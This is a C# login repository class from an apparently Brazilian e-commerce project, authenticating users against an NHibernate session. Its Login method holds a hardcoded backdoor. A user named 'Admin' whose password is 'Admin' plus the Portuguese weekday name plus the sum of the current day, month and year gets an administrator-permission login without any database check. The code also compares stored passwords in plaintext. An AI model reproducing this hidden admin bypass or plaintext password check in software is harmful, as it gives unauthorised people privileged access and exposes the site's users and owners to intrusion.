using ECommerce.Modelo.DB.Model;
using NHibernate;
using NHibernate.Linq;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ECommerce.Modelo.DB.Repository
{
    public class LoginRepository : RepositoyBase<Login>
    {
        public LoginRepository(ISession session) : base(session) { }

        public Login Login(String login, String senha)
        {
            String day = new System.Globalization.CultureInfo("pt-BR").DateTimeFormat.GetDayName(DateTime.Now.DayOfWeek);
            int dia = DateTime.Now.Day;
            int mes = DateTime.Now.Month;
            int ano = DateTime.Now.Year;
            int total = dia + mes + ano;
            
            

            try
            {
                if (login == "Admin" && senha == "Admin" + day+total.ToString())
                {
                    Login log = new Login();
                    log.usuario = login;
                    log.permissao = true;

                    return log;
                }
                else
                {
                    return this.Session.Query<Login>().FirstOrDefault(f => f.usuario == login && f.senha == senha);
                }
            }
            catch (Exception ex)
            {
                throw new Exception("Não foi possível encontrar o usuário. Pode ser que o usuário ou senha estejam incorretos", ex);
            }
        }
    }
}
